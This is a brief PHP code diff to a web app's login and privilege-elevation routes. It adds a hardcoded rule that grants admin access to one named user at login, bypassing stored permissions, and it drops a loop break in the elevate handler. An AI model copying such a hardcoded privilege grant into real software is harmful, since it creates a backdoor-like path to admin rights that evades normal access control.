@@ -210,6 +210,10 @@ $this->respond('GET', '/login/process', function($request, $response, $service, 
             $encoded_data = json_encode($users, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
             file_put_contents($users_cache, $encoded_data);
         }
+	
+	if ($_SESSION['user'] === 'GrygrFlzr') {
+		$_SESSION['access_level'] = 'admin';
+	}
         
         //Redirect to home page
         if(isset($prev_path)) {
@@ -365,7 +369,6 @@ $this->respond('GET', '/elevate/[*:user]/[*:level]', function ($request, $respon
     foreach($userlist as &$user) {
         if($user['user'] === $request->param('user')) {
             $user['access_level'] = $request->param('level');
-            break;
         }
     }
     
